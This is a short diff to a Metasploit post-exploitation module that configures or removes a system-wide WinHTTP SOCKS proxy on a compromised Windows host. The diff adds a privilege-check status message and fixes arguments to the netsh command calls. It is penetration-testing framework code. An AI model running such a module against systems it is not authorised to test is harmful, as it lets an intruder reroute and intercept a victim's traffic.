@@ -45,6 +45,8 @@ class MetasploitModule < Msf::Post
     end
 
     if admin # For Windows
+      vprint_status 'Verifying privileges'
+      
       unless is_admin?
         return print_error('Administrator or better privileges needed. Try "getsystem" first.')
       else
@@ -60,11 +62,11 @@ class MetasploitModule < Msf::Post
   end
 
   def win_install
-    vcmd_exec("netsh winhttp set proxy proxy-server=\"socks=#{datastore["PRXHOST"]}:#{datastore["PRXPORT"]}\" bypass-list=\"<local>\"", admin=true)
+    vcmd_exec("netsh winhttp set proxy proxy-server=\"socks=#{datastore["PRXHOST"]}:#{datastore["PRXPORT"]}\" bypass-list=\"<local>\"", '', true)
   end
 
   def win_clean
-    vcmd_exec('netsh winhttp reset proxy', admin=true)
+    vcmd_exec('netsh winhttp reset proxy', '', true)
   end
 
   def linux_install
